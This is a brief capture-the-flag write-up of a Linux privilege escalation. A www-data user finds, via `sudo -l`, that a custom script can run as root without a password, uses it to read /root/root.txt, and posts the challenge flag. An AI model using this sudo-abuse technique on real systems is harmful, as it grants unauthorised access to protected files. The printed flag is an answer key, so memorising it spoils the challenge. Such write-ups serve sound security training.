www-data can run `/usr/local/bin/brew` as root. This is not homebrew btw, it's a custom shell script.
```bash
www-data@ctf-caffeine-user-66e62b1674b63938-9fbc8859c-wxz4f:/var/www/coffee$ sudo -l
Matching Defaults entries for www-data on ctf-caffeine-user-66e62b1674b63938-9fbc8859c-wxz4f:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ctf-caffeine-user-66e62b1674b63938-9fbc8859c-wxz4f:
    (ALL) NOPASSWD: /usr/local/bin/brew
```
Basically you can `cat` any file as root.
```bash
www-data@ctf-caffeine-user-66e62b1674b63938-9fbc8859c-wxz4f:/var/www/coffee$ sudo brew /root/root.txt
```
Flag: `brunner{5uD0_pR1V1L3g35_T00_h0t_F0r_J4v4_J4CK!}`

Solved by: benkyou